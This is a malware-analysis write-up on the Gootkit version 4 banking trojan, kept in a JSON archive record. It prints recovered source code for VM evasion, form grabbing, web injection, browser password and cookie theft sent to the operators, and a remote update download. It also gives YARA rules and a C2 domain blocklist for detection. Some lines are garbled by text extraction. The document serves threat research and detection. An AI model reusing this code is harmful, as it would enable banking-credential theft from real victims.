{
    "id": "750c0424-8eff-4fe8-bf1f-e0529a9daa3e",
    "created_at": "2023-01-12T15:08:07.215983Z",
    "updated_at": "2025-03-27T02:08:23.155531Z",
    "deleted_at": null,
    "sha1_hash": "f5c59ceee26e612ce269dcb278ada2f38de75151",
    "title": "2018-04-13 - Let's Learn- In-Depth Dive into Gootkit Banker Version 4 Malware Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T04:12:39Z",
    "file_modification_date": "2022-05-28T04:12:39Z",
    "file_size": 350950,
    "plain_text": "# Let's Learn: In-Depth Dive into Gootkit Banker Version 4 Malware Analysis\n\n**vkremez.com/2018/04/lets-learn-in-depth-dive-into-gootkit.html**\n\n**Goal: Analyze and reverse the Gootkit banking malware version 4 in depth.**\n\n**Background: While reviewing several latest malware spam campaigns reported by multiplier researchers ranging from abusing legitimate**\n[email content services such as Mailchimp and Mailgun as reported by Derek Knight, I took a deeper into into malware analysis of the](https://twitter.com/dvk01uk)\ncampaigns authored by the Gootkit cybercrime gang.\n\n[Fake EMERGE FINANCE invoice delivers Gootkit banking trojan via Microsoft https://t.co/X6D8bt7SPg and the Mailgun SMTP](https://t.co/X6D8bt7SPg)\n[relay service https://t.co/G1gdWLx0BV](https://t.co/G1gdWLx0BV) [pic.twitter.com/myg2YETlsz](https://t.co/myg2YETlsz)\n[— My Online Security (@dvk01uk) April 10, 2018](https://twitter.com/dvk01uk/status/983704311317352448?ref_src=twsrc%5Etfw)\n\n**Outline:**\n\nI. Analysis\n\nII. Malware Drop Sequence\n\nIII. Module Overview\n\nIV. Registry Persistence\n\nV. Yara: Main & Password Grabber Module\n\nVI. Domain Blocklist\n\nVII. Appendix\n**I. Overview of Gootkit Banking Malware**\n\nGootkit is a modularized multi-functional Windows banking malware. The malware contains a rich functionality from webinject and Local\nSecurity Authority (LSA) grabber to Video Recorder and Mail Parser ones. Not only the gang is resourceful leveraging Node.js as the de-facto\nformat for its functionality, they also borrow a lot of ideas from other malware variants. For example, in its \"zeusfunctions,\" the gang\nimplements ZeuS-style URL mask parsing and matching visited websites; the gang also has a module called \"grabPasswordsPony\" meant to\nassist with credential recovery from compromised machines. Some of the malware oddities are its ability it various references to itself as\n\"Gootkit\" and their control domains mimicking fake \"SSL\" websites. The malware also contains their own Password Grabber “grabber.dll”\n```\nfs.writeFileSync(\ntmpDirectory + \"\\\\descr.txt\", \n\"Uploaded by Gootkit :D\",\n\"botid : \",\nprocess.machineGuid,\n\"Date : \",\nnew Date().toUTCString(),\n\"Original filenames : \",\nfilenames.join(\"\\r\\n\")\n\n```\n**II. Malware drop sequence:**\n\n**Main dropper (MD5: ba0f798acc31ff6984af91f235f5fac4)**\n\n-> Node.js main loader binary (MD5: ba0f798acc31ff6984af91f235f5fac4)\n\n-> \"GrabPasswords\" module (MD5: 1654b553a500ecf2f196216be458da05)\n\nExport function: \"GrabPasswords\"\n\nThe decoded server configuration was as follows:\n```\nsafenetssl[.]com|safenetssl[.]com|securesslweb[.]com\n\n```\nThe main component is an exe code packaged via Node JavaScript bundle. The malware checks for the patterns \"-test\" and \"-vwxyz.\"\n\n\n-----\n\nA. Obfuscation\nMain dropper is loaded in obfuscated form with strings encoded with XOR with round key.\nFor example,\n```\n for ( k = 0; k < sizeof(array_encoded); ++k )\n  _byteorder_func(&v264, k, *(&last_array_element + k % 5) ^ *(&first_array_elem + k));\n\n```\nTo generate and decode the bot also leverages Mersenne Twister, a pseudorandom number generator (PRNG).\nB. The dropper creates a mutex thread \"ServiceEntryPointThread\"\nC. Anti-Analysis \"vmx_detection\"\n\nThe malware checks environment variable \"crackmelolo\" with series of checks and alters if its execution if not founds. Kaspersky Labs\n[previous reported on \"crackme.\" Gootkit calls the anti-analysis routine as \"vmx_detection.\"](https://securelist.com/inside-the-gootkit-cc-server/76433/)\nThe key main function of \"IsVirtualMachine\" are as follows:\n\nVmCheckGetDisksArray\nVmCheckVitrualDisks\nVmIsVirtualCPUPresent\nIsVirtualMachine\n\n\n-----\n\n```\n  //print('IsVirtualMachine >>> ');\n  var bIsVirtualMachine = false;\n  try{\n    var VMBioses = [\n      \"AMI \",\n      \"BOCHS\",\n      \"VBOX\",\n      \"QEMU\",\n      \"SMCI\",\n      \"INTEL - 6040000\",\n      \"FTNT-1\",\n      \"SONI\"\n    ];\n    var SystemBiosVersion =\n      (new reg.WindowsRegistry(HKEY_LOCAL_MACHINE, \"HARDWARE\\\\DESCRIPTION\\\\System\", KEY_READ, true)\n        .ReadString(\"SystemBiosVersion\") || \"hui\").toString();\n    for (let i = 0; i < VMBioses.length; i++) {\n      if (SystemBiosVersion.toLowerCase().indexOf(VMBioses[i].toLowerCase()) !== -1) {\n        bIsVirtualMachine = true;\n        break;\n      }\n    }\n    var ideDev\nices = VmCheckGetDisksArray('SYSTEM\\\\CurrentControlSet\\\\Enum\\\\IDE');\n    var scsiDevices = VmCheckGetDisksArray('SYSTEM\\\\CurrentControlSet\\\\Enum\\\\SCSI');\n    if (bIsVirtualMachine === false) {\n      bIsVirtualMachine = (\n        VmCheckVitrualDisks(ideDevices.keys) ||\n        VmCheckVitrualDisks(scsiDevices.keys)\n      );\n    }\n    if (bIsVirtualMachine === false) {\n      bIsVirtualMachine = VmIsVirtualCPUPresent();\n    }\n  } catch (exc) {\n  }\n  return bIsVirtualMachine;\n\n```\n**III. Modules and Functionality Overview**\nGootkit is extremely rich containing various functions and modules:\n\nAPI Hooker\nTake Screenshot\nGet Process List\nGet Local Network Neighborhood\nGet Local Users and Groups\nLSA Grabber Credential\nBrowser Stealer\nCookie Grabber\nVirtual Network Computing (VNC) Remote Controller\nKeylogger\nFormgrabber\nHTTP/HTTPS Webinjector / Redirector\nVideo Recorder\nMail Parser\nProxy\n\nconst P_SPYWARE = 4;\nprocess.PORT_REDIRECTION_BASE = PORT_REDIRECTION_BASE;\nexports.SpInitialize = gootkit_spyware.SpInitialize;\nexports.SpHookRecv = gootkit_spyware.SpHookRecv;\nexports.SpHookSend = gootkit_spyware.SpHookSend;\nexports.SpUnhookHttp = gootkit_spyware.SpUnhookHttp;\nexports.SpTakeScreenshot = gootkit_spyware.SpTakeScreenshot;\nexports.SpGetProcessList = gootkit_spyware.SpGetProcessList;\nexports.SpGetLocalNetworkNeighborhood = gootkit_spyware.SpGetLocalNetworkNeighborhood;\nexports.SpGetLocalUsersAndGroups = gootkit_spyware.SpGetLocalUsersAndGroups;\nexports.SpLsaGrabCredentials = gootkit_spyware.SpLsaGrabCredentials;\nexports.DbgGetModuleDebugInformation = gootkit_spyware.DbgGetModuleDebugInformation;\nexports.DbgGetLoadedModulesList = gootkit_spyware.DbgGetLoadedModulesList;\nexports.DnsCacheGetDomainByAddr = gootkit_spyware.DnsCacheGetDomainByAddr;\nexports.downloadFileRight = gootkit_spyware.DownloadFileRight;\nexports.SpAddPortRedirection = gootkit spyware.SpAddPortRedirection;\n\n\n-----\n\ne po ts SpGet e do goot t_spy a e SpGet e do ;\nexports.SpGetFileWatermark = gootkit_spyware.SpGetFileWatermark;\nexports.SpSetFileWatermark = gootkit_spyware.SpSetFileWatermark;\nexports.ExLoadVncDllSpecifyBuffers = gootkit_spyware.ExLoadVncDllSpecifyBuffers;\nexports.ModExecuteDll32 = gootkit_spyware.ModExecuteDll32;\nmodule.exports.collectCromePasswords = collectCromePasswords;\nmodule.exports.collectFirefoxPasswords = collectFirefoxPasswords;\nmodule.exports.collectWindowsPasswords = collectWindowsPasswords;\nmodule.exports.collectIeCookies = collectIeCookies;\nmodule.exports.collectChromiumCookies = collectChromiumCookies;\nmodule.exports.collectFireFoxCookies = collectFireFoxCookies;\nmodule.exports.collectChromePackedProfile = collectChromePackedProfile;\nmodule.exports.sendCookiesToStore = sendCookiesToStore;\nmodule.exports.grabPasswordsPony = grabPasswordsPony;\n**V. The bot and spyware message**\nThe bot harvester message is as follows:\nmessage Bot {\noptional string processName = 1;\noptional string guid = 2;\noptional string vendor = 3;\noptional string os = 4;\noptional string ie = 5;\noptional string ver = 6;\noptional int32 uptime = 7;\noptional int32 upspeed = 8;\noptional string internalAddress = 9;\noptional string HomePath = 10;\noptional string ComputerName = 11;\noptional string SystemDrive = 12;\noptional string SystemRoot = 13;\noptional string UserDomain = 14;\noptional string UserName = 15;\noptional string UserProfile = 16;\noptional string LogonServer = 17;\noptional int64 freemem = 18;\noptional int64 totalmem = 19;\noptional NetworkInterfaces networkInterfaces = 20;\noptional string tmpdir = 21;\nrepeated Processor cpus = 22;\noptional string hostname = 23;\noptional bool IsVirtualMachine = 24;\n}\nThe bot settings are:\nmessage BotSettings {\noptional int32 fgMaxDataSize = 1  [default = 65000];\noptional int32 fgMinDataSize = 2  [default = 0];\noptional bool fgCaptureGet = 3  [default = false];\noptional bool fgCapturePost = 4  [default = true];\noptional bool fgCaptureCookies = 5[default = false];\nrepeated string fgBlackList = 6;\nrepeated string fgWhiteList = 7;\noptional int32 netCcTimeout = 8  [default = 300000];\noptional bool kgIsKeyloggerEnabled = 9[default = false];\n}\nThe bot tasks message looks as follows:\nmessage Tasks {\nmessage Settings {\noptional int32 pingTime = 1;\n}\noptional Settings settings = 1;\noptional bytes   slch = 2;\noptional bytes   rbody32_hash = 3;\noptional bytes   rbody64_hash = 4;\n\n\n-----\n\nopt o a bytes de au tjs_ as 5;\n}\nThe \"spyware\" config is as follows:\nmessage SpywareConfig {\nrepeated SpywareConfigEntry injects = 1;\nrepeated VideoConfigEntry recorders = 2;\nrepeated FragmentConfigEntry fragments = 3;\nrepeated MailFilterEntry emailfilter = 4;\nrepeated RedirectionEntry redirects = 5;\nrepeated PostParamsRecorderEntry post2macros = 6;\noptional BotSettings settings = 7;\n```\nif(os.release().split('.')[0] === '5'){\nprocess.g_malwareBodyRegistryPath = \"SOFTWARE\";\n}else{\nprocess.g_malwareBodyRegistryPath = \"SOFTWARE\\\\AppDataLow\";\nprocess.g_malwareRegistryPath = \"SOFTWARE\\\\cxsw\";\nprocess.g_malwareRegistryHive = HKEY_CURRENT_USER;\nprocess.g_SpDefaultKey = \"{da14b39e-535a-4b08-9d68-ba6d14fed630}\";\nprocess.g_SpPrivateKey = \"{bed00948-29e2-4960-8f98-4bcd7c6b00a5}\";\n\n```\n**VI. Formgrabber**\n```\n  process.formgrabber.options = {\n    http : {\n      grubGet : false,\n      grubPost : true\n    },\n    https : {\n      grubGet : true,\n      grubPost : true\n    }\n  }\nvar restrictedHosts = [\n  'www.google-analytics.com',\n  'counter.rambler.ru',\n  'rs.mail.ru',\n  'suggest.yandex.ru',\n  'clck.yandex.ru',\n  'plus.google.com',\n  'plus.googleapis.com',\n  's.youtube.com',\n  'urs.microsoft.com',\n  'safebrowsing-cache.google.com',\n  'safebrowsing.google.com',\n  'www.youtube.com'\nvar restrictedExtensions = [\n  '.png', '.jpg', '.jpeg', '.gif', '.bmp',\n  '.pcx', '.tiff', '.js', '.css', '.swf',\n  '.avi', '.mpg', '.aac', '.mp3', '.mov',\n  '.jar', '.cnt', '.scn', '.ico'\nvar restrictedSubstrings = [\n  'safebrowsing',\n  '.metric.gstatic.com',\n  '/complete/search'\nprocess.formgrabber = {\n  restrictedExtensions: restrictedExtensions,\n  restrictedHosts: restrictedHosts,\n  restrictedSubstrings: restrictedSubstrings,\n\n```\n\n-----\n\n```\n  options: {\n    http: {\n      grubGet: false,\n      grubPost: false\n    },\n    https: {\n      grubGet: false,\n      grubPost: false\n    }\n  }\nexports.formgrabber = process.formgrabber;\n\n```\n**IX. HTTP/HTTPS Webinjector**\n\n\n-----\n\n```\n// -- http/https injects\n//-----------------------------------------------function isInternalApiRequest(requestDesc){\n  if(requestDesc.location.indexOf('spinternalcall') !== -1){\n    return true;\n  }\n  return false;\nfunction IsLocationLocked(location){\n  //trace(\"IsLocationLocked : '%s'\", location);\n  if(!process.proxyServers){\n    return false;\n  }\n  if(!process.proxyServers.blockedAddresses){\n    return false;\n  }\n  for(let i = 0; i < process.proxyServers.blockedAddresses.length; i ++){\n    if (zeusfunctions.zeusSearchContentIndex(location, \n      process.proxyServers.blockedAddresses[i])\n    ){\n      return true;\n    }\n  }\n  return false;\nfunction ReqProcessFakes(clientRequest){\n  if(!clientRequest.headers['host']){\n    return false;\n  }\n  var host = clientRequest.headers['host'].split(':')[0];\n  if(process.proxyServers.fakes[host]){\n    clientRequest.fakeHost = \n      process.proxyServers.fakes[host];\n    return true;\n  }\n  return false;\nfunction manageUserConnection(clientRequest, clientResponse, isSsl) {\n  clientRequest.isSSL = isSsl;\n  clientRequest.desc = createUrlDescriptionFromRequestObject(clientRequest);\n  clientRequest.id = getid();\n  if(isInternalApiRequest(clientRequest.desc)){\n    return require('internalapi').serve(clientRequest, \n      clientResponse);\n  }\n  if(IsLocationLocked(clientRequest.desc.location) === true){\n    return /*clientResponse.end();*/ \n    /* \n      emulate browser \n      time-out error for now\n    */\n  }\n\n```\n\n-----\n\n```\n  ReqProcessFakes(clientRequest);\n  http_injection_stream.IsContentModificationNeeded(clientRequest, function (bIsContentBufferingNeeded) {\n    let func = http_injection_stream.ThrottleRequestToBrowserDirect;\n    if(bIsContentBufferingNeeded){\n      func = http_injection_stream.ThrottleRequestToBrowserInjected;\n    }\n    func(clientRequest, clientResponse);\n  });\n\n```\n**Web Redirection Code:**\n```\nfunction ReqProcessRedirects(clientRequest){\n  let id = clientRequest.id;\n  /*\n  clientRequest.isRedirectionRuleTriggered - boolean\n  \"redirects\": [\n    {\n      \"name\": \"yandex test\",\n      \"uri\": \"hxxps://yastatic[.]net\",\n      \"keyword\": \"wfjwe892njf902n3f\",\n      \"uripassword\": \"\",\n      \"datapassword\": \"\"\n    }\n  ]\n  hxxps://mail[.]ru/wfjwe892njf902n3f/share/cnt[.]share[.]js -> hxxps://yastatic[.]net/share/cnt[.]share[.]js\n  */\n  if (util.isUndefined(clientRequest)) {\n    return false;\n  }\n  if (util.isUndefined(clientRequest.desc)) {\n    return false;\n  }\n  var murl = clientRequest.desc.location;\n  var method = clientRequest.desc.method.toUpperCase();\n  var bRedirectTriggered = false;\n  if (method !== 'GET' && method !== 'POST') {\n    rlog('ReqProcessRedirects', id, 'invalid method', method);\n    return false;\n  }\n\n```\n**IV. Persistence settings in HKEY_CURRENT_USER:**\n```\nif(os.release().split('.')[0] === '5'){\nprocess.g_malwareBodyRegistryPath = \"SOFTWARE\";\n}else{\nprocess.g_malwareBodyRegistryPath = \"SOFTWARE\\\\AppDataLow\";\nprocess.g_malwareRegistryPath = \"SOFTWARE\\\\cxsw\";\nprocess.g_malwareRegistryHive = HKEY_CURRENT_USER;\nprocess.g_SpDefaultKey = \"{da14b39e-535a-4b08-9d68-ba6d14fed630}\";\nprocess.g_SpPrivateKey = \"{bed00948-29e2-4960-8f98-4bcd7c6b00a5}\";\n\n```\n**V. Yara Rule:**\nrule crime_win32_gootkit_main_bin {\n\nmeta:\ndescription = \"Gootkit banking malware dropper binary\"\nauthor = \"@VK_Intel\"\nreference = \"Detects Gootkit main dropper\"\ndate = \"2018-04-10\"\nhash = \"360744e8b41e903b59c37e4466af84b7defe404ec509eca828c9ecdfe878d74a\"\n\nstrings:\n$s0 = \"\\\\SystemRoot\\\\system32\\\\mstsc.exe\" fullword wide\n$s1 = \"RunPreSetupCommands = %s:2\" fullword wide\n$s2 = \"AdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\" fullword wide\n\n\n-----\n\n$s3 /c p g oca ost & de / /Q \\ u o d de\n$s4 = \"< destination IP address >\" fullword ascii\n$s7 = \".update\\\" \\\"\" fullword wide\n$s11 = \"& move /Y \\\"\" fullword wide\n$s16 = \".update\" fullword wide\n$s19 = \"signature = \\\"$CHICAGO$\\\"\" fullword wide\n\ncondition:\nuint16(0) == 0x5a4d and filesize < 474KB and all of them\n}\n\nrule crime_win32_gootkit_grab_password_module {\nmeta:\ndescription = \"Gootkit grabber.dll module\"\nauthor = \"@VK_Intel\"\nreference = \"Detects Gootkit Password Grabber Module\"\ndate = \"2018-04-13\"\nhash = \"f523da4e7a54aa14f37b513097c1ac8e035365f9ab5a34a610b05572d61a5558\"\nstrings:\n$s0 = \"grabber.dll\" fullword wide\n$s1 = \"GrabPasswords\" fullword wide\n$s2 = \"\\\"encryptedPassword\\\":\\\"\" fullword ascii\n$s3 = \"Pstorec.dll\" fullword wide\n$s4 = \"fireFTPsites.dat\" fullword wide\n$s5 = \"inetcomm server passwords\" fullword wide\n$s6 = \"\\\"login\\\":\\\"\" fullword ascii\n$s7 = \"D:\\\\Account.CFN\" fullword wide\n$s8 = \"outlook account manager passwords\" fullword wide\n$s9 = \"SMTP_Password2\" fullword wide\n\ncondition:\nuint16(0) == 0x5a4d and filesize < 723KB and all of them\n}\n**VI. Gootkit Domain Blocklist:**\nsafenetssl[.]com\nsecuresslweb[.]com\nnetsecuressl[.]com\nsecuresslservice[.]com\nsecsslnetwork[.]com\nsslnetsecurity[.]com\n\n**VII. Gootkit Appendix:**\n**A. Global Certificate**\nvar global_cert = \"-----BEGIN CERTIFICATE----\\r\\nMIICtzCCAiCgAwIBAgJAwj/sQrLq6n+7nn9OSX0zzgGhP834SgLjlxQ96GHioum4\\r\\nj3w7bUQWVwUYjadfxZxt3S/xsss3zG5yJGJyFK64ATANBg\n----END CERTIFICATE-----\\r\\n\";\n**B. Gootkit Global RSA Key**\nvar global_key = \"-----BEGIN RSA PRIVATE KEY----\\nMIICXQIBAAKBgQCuKr4ew8Gh7/8QgbLv9oMKxL3lQRtUFV55g57g6l4453LeETjw\\r\\ncANgUQrAwy7Y8uH2r1vM2fFpelFjwCZ1ynkaTiMcnlqRdc\nf0zafBVGaFEJ/0igR/zAMctqoHSE9fvuCRiY5+0fh5cECQATs\\r\\nn2Jx7vl+cKOWySXqaiZPZLF18aQbY7PDJSmUUq4Jd/xB3/8J554tnpOW2R3IXC4\n----END RSA PRIVATE KEY-----\";\nprocess.tls = {\nciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHEECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSAAES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHERSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-RSADES-CBC3-SHA:ECDHE-ECDSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDHDSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA',\nmethod : 'TLSv1_method'\n\n**C. LSA Grabber Message:**\nmessage LsaAuth {\n\n\n-----\n\nopt o a st g Use a e ;\noptional string UserDomain = 2;\noptional string UserPassword = 3;\n}\nmessage MailMessage {\noptional string html = 1;\noptional string text = 2;\noptional string subject = 3;\noptional string messageId = 4;\noptional string inReplyTo = 5;\noptional string priority = 6;\noptional string from = 7;\noptional string to = 8;\noptional string date = 9;\noptional string receivedDate = 10;\noptional string headers = 11;\noptional bool isDeletedByMailware = 12;\n}\nmessage LogLine {\noptional string logstr = 1;\n}\n\nmessage KeyloggerReport {\noptional string keystroke = 1;\noptional string windowName = 2;\noptional string processPath = 3;\n}\n\nmessage WindowChangeEventMessage {\noptional int32 localTimeDate = 1;\noptional string windowName = 2;\noptional string processPath = 3;\n}\n\nmessage SecureDeviceEventLog {\noptional int32 localTimeDate = 1;\noptional string deviceName = 2;\noptional string eventName = 3;\noptional string lastWindowName = 4;\noptional string lastProcessPath = 5;\n}\n\n**D. Command Execution Message:**\nmessage CommandExecutionRequest {\noptional string process = 1;\noptional string command = 2;\n}\n\n**E. File Upload Message:**\nmessage FileUpload {\noptional string filename = 1;\noptional bytes content = 2;\n}\n\nmessage FileAttribues {\noptional string name = 1;\noptional string realname = 2;\noptional bool isFile = 3;\noptional bool isDirectory = 4;\noptional bool isBlockDevice = 5;\noptional bool isSymbolicLink = 6;\noptional int64 size = 7;\noptional int64 ctime = 8;\n\noptional int64 atime = 9;\n\n\n-----\n\n}\n\nmessage DirectoryListing{\nrepeated FileAttribues files = 1;\n}\n\n**F. Bot Config Message:**\nmessage RedirectionEntry {\noptional string name = 1;\noptional string uri = 2;\noptional string keyword = 3;\noptional string uripassword = 4;\noptional string datapassword = 5;\n}\n\nmessage ProcessModule {\noptional string szExePath = 1;\noptional uint32 GlblcntUsage = 2;\noptional uint64 hModule = 3;\noptional uint64 modBaseAddr = 4;\noptional uint64 modBaseSize = 5;\noptional uint32 ProccntUsage = 6;\noptional uint32 pcPriClassBase = 7;\noptional uint32 dwFlags = 8;\noptional string szModule = 9;\noptional uint32 th32ModuleID = 10;\noptional uint32 th32ProcessID = 11;\n}\n\nmessage Process {\noptional string szExeFile = 1;\noptional uint32 cntUsage = 2;\noptional uint32 th32ProcessID = 3;\noptional uint32 th32ModuleID = 4;\noptional uint32 cntThreads = 5;\noptional uint32 th32ParentProcessID = 6;\noptional uint32 pcPriClassBase = 7;\noptional uint32 dwFlags = 8;\noptional bool owned = 9;\nrepeated ProcessModule modules = 10;\n}\n\nmessage ProcessList {\nrepeated Process Processes = 1;\n}\n\nmessage BaseEntryBlock {\nrepeated string url = 1;\noptional bool enabled = 2      [default = true];\nrepeated string guids = 3;\noptional bool filt_get = 4     [default = true];\noptional bool filt_post = 5     [default = true];\n}\n\nmessage SpywareConfigEntry {\nrequired BaseEntryBlock base = 1;\noptional string data_before = 2;\noptional string data_inject = 3;\noptional string data_after = 4;\nrepeated string stoplist = 5;\n}\n\nmessage VideoConfigEntry {\nrequired BaseEntryBlock base = 1;\n\n\n-----\n\noptional bool grayScale = 2     [default = true];\noptional int32 framerate = 3    [default = 5];\noptional int32 seconds = 4     [default = 30];\noptional string filenameMask = 5;\noptional bool uploadAfterRecord = 6 [default = true];\noptional string hashkey = 7;\nrepeated string stoplist = 8;\n}\n\nmessage FragmentConfigEntry {\nrequired BaseEntryBlock base = 1;\n\noptional string from = 2;\noptional string to = 3;\noptional string varname = 4 [default = ''];\n}\n\nmessage MailFilterEntry {\noptional string from = 1;\noptional string to = 2;\noptional string subject = 3;\noptional string body = 4;\n}\n\nmessage PostParamsRecorderEntry {\nrequired BaseEntryBlock base = 1;\noptional string paramname = 2;\noptional string macrosname = 3;\n}\n\nmessage BotSettings {\noptional int32 fgMaxDataSize = 1  [default = 65000];\noptional int32 fgMinDataSize = 2  [default = 0];\noptional bool fgCaptureGet = 3  [default = false];\noptional bool fgCapturePost = 4  [default = true];\noptional bool fgCaptureCookies = 5[default = false];\nrepeated string fgBlackList = 6;\nrepeated string fgWhiteList = 7;\noptional int32 netCcTimeout = 8  [default = 300000];\n\noptional bool kgIsKeyloggerEnabled = 9[default = false];\n}\n\nmessage SpywareConfig {\nrepeated SpywareConfigEntry injects = 1;\nrepeated VideoConfigEntry recorders = 2;\nrepeated FragmentConfigEntry fragments = 3;\nrepeated MailFilterEntry emailfilter = 4;\nrepeated RedirectionEntry redirects = 5;\nrepeated PostParamsRecorderEntry post2macros = 6;\noptional BotSettings settings = 7;\n}\n\n**G. Bot Message Buffer**\nmessage AdapterAddress {\noptional string address = 1;\noptional string netmask = 2;\noptional string family = 3;\noptional string mac = 4;\noptional int32 scopeid = 5;\noptional bool internal = 6;\n}\n\n\n-----\n\nmessage NetworkInterface {\noptional string connectionName = 1;\nrepeated AdapterAddress adresses = 2;\n}\n\nmessage NetworkInterfaces {\nrepeated NetworkInterface Interfaces = 1;\n}\n\nmessage Processor {\noptional string model = 1;\noptional int32 speed = 2;\n}\n\nmessage Bot {\noptional string processName = 1;\noptional string guid = 2;\noptional string vendor = 3;\noptional string os = 4;\noptional string ie = 5;\noptional string ver = 6;\noptional int32 uptime = 7;\noptional int32 upspeed = 8;\noptional string internalAddress = 9;\noptional string HomePath = 10;\noptional string ComputerName = 11;\noptional string SystemDrive = 12;\noptional string SystemRoot = 13;\noptional string UserDomain = 14;\noptional string UserName = 15;\noptional string UserProfile = 16;\noptional string LogonServer = 17;\noptional int64 freemem = 18;\noptional int64 totalmem = 19;\noptional NetworkInterfaces networkInterfaces = 20;\noptional string tmpdir = 21;\nrepeated Processor cpus = 22;\noptional string hostname = 23;\noptional bool IsVirtualMachine = 24;\n}\n\nmessage Tasks {\n\nmessage Settings {\noptional int32 pingTime = 1;\n}\n\noptional Settings settings = 1;\noptional bytes   slch = 2;\noptional bytes   rbody32_hash = 3;\noptional bytes   rbody64_hash = 4;\noptional bytes   defaultjs_hash = 5;\n}\nmessage BodyUpdate {\noptional int32 platform = 1;\noptional bytes newbody = 2;\n}\n\n**H. Formgrabber Buffer**\nmessage Form {\noptional string method = 1;\noptional string source = 2;\noptional string location = 3;\n\n\n-----\n\nopt o a st g e e e ;\noptional bool isSsl = 5;\noptional string rawHeaders = 6;\noptional bytes postData = 7;\noptional string protocol = 8;\noptional bool isCertificateUsed = 9;\noptional bool isLuhnTestPassed = 10;\noptional string remoteAddress = 11;\n}\n\nmessage GrabbedPageFragment {\noptional string url = 1;\noptional string from = 2;\noptional string to = 3;\noptional string fragmentText = 4;\noptional string source = 5;\n}\n\n**IX. FileUpload Buffer**\nmessage FileUpload {\noptional string filename = 1;\noptional bytes content = 2;\n}\n\nmessage FileAttribues {\noptional string name = 1;\noptional string realname = 2;\noptional bool isFile = 3;\noptional bool isDirectory = 4;\noptional bool isBlockDevice = 5;\noptional bool isSymbolicLink = 6;\noptional int64 size = 7;\noptional int64 ctime = 8;\noptional int64 atime = 9;\n}\n\nmessage DirectoryListing{\nrepeated FileAttribues files = 1;\n}\n\n**I. Local Variable Message**\n\nmessage LocalVar {\noptional string name = 1;\noptional string value = 2;\n}\n\nmessage LocalVarsList {\nrepeated LocalVar vars = 1;\noptional int32 timestamp = 2;\n}\n\n**J. SpCollectPasswords**\n\nfunction SpCollectPasswords(query, response, request) {\nlet result = [];\nlet last_timeout = 0;\nlet isConnectionClosed = false;\nfunction resetAutoendTimeout() {\nif (last_timeout !== 0) {\nclearTimeout(last_timeout);\n}\nlast_timeout = setTimeout(function () {\n\nisConnectionClosed = true;\n\n\n-----\n\nespo se e d();\n}, 20000);\n}\nsaved_creds.collectWindowsPasswords(function (item) {\nif (isConnectionClosed === false){\nresponse.write(JSON.stringify({\ntype : 'windows',\nusername : item.username_value,\nurl : item.origin_url,\npassword : item.password_value\n}));\n}\n});\nsaved_creds.collectCromePasswords(function (item) {\nif (isConnectionClosed === false) {\nresponse.write(JSON.stringify({\ntype: 'chrome',\nusername: item.username_value,\nurl: item.origin_url,\npassword: item.password_value\n}));\n}\n});\n\n**K. grabPasswordsPony**\n\nfunction grabPasswordsPony() {\npstorage.getPasswordsFromGrabber(function (error, result) {\nif (result.length > 1) {\nresult = result.split('\\n').map(function (line) {\nreturn line.trim().split('|');\n}).forEach(function (password_entry) {\nif (password_entry.length === 4) {\nspyware.SendAuthInformationPacket(\npassword_entry[2],\n'(' + password_entry[0] + ') ' + password_entry[1],\npassword_entry[3]\n);\n} else if (password_entry.length === 5) {\nspyware.SendAuthInformationPacket(\npassword_entry[3],\n'(' + password_entry[0] + ') ' + password_entry[2],\npassword_entry[4]\n);\n} else {\nprocess.log('UNABLE_PARSE_PASSWORD : ', password_entry.join('|'));\n}\n});\n\n**L. GetCCType**\n\nfunction GetCCType(cc_num) {\nvar type = 0;\nif (cc_num.charAt(0) == '4' && (cc_num.length == 16 || cc_num.length == 13))\ntype = 1;\nelse if (cc_num.charAt(0) == '5' && cc_num.length == 16)\ntype = 2;\nelse if (cc_num.charAt(0) == '3' && (cc_num.charAt(1) == '4' || cc_num.charAt(1) == '7') && cc_num.length == 15)\ntype = 3;\nelse if (cc_num.charAt(0) == '6' && cc_num.charAt(1) == '0' && cc_num.charAt(2) == '1' && cc_num.charAt(3) == '1' && cc_num.length ==\n16)\ntype = 4;\nreturn type;\n\n\n-----\n\n**u** **C**\n\nfunction luhnChk(luhnstr) {\ntry {\nvar luhn = luhnstr.replace(/[^0-9]/g, '');\nvar len = luhn.length,\nmul = 0,\nprodArr = [\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9],\n[0, 2, 4, 6, 8, 1, 3, 5, 7, 9]\n],\nsum = 0;\n\nif (len != 16 || ((luhn.length - len) >= 6)) {\nreturn false;\n}\nif (GetCCType(luhn) == 0) {\nreturn false;\n}\nif (calculateAlphabetSize(luhn).length < 5) {\nreturn false;\n}\nwhile (len--) {\nsum += prodArr[mul][parseInt(luhn.charAt(len), 10)];\nmul ^= 1;\n}\nreturn sum % 10 === 0 && sum > 0;\n} catch (exception) {\nconsole.error(exception)\nreturn false;\n}\n\n**N. downloadUpdate**\n\nfunction downloadUpdate(serverHost, callback){\nvar arch = { 'ia32' : 32, 'x64' : 64 };\nvar updateLink = util.format(\"https://%s:80/rbody%d\", serverHost, arch[process.arch]);\ngootkit_spyware.DownloadFileRight(updateLink, function(error, fileBuffer){\ncallback(error, fileBuffer);\n});\n\n**O. fpatchIETabs**\n\nfunction fpatchIETabs(){\nvar reg = process.binding(\"registry\");\nvar x = new reg.WindowsRegistry(\nHKEY_CURRENT_USER,\n\"Software\\\\Microsoft\\\\Internet Explorer\\\\Main\", 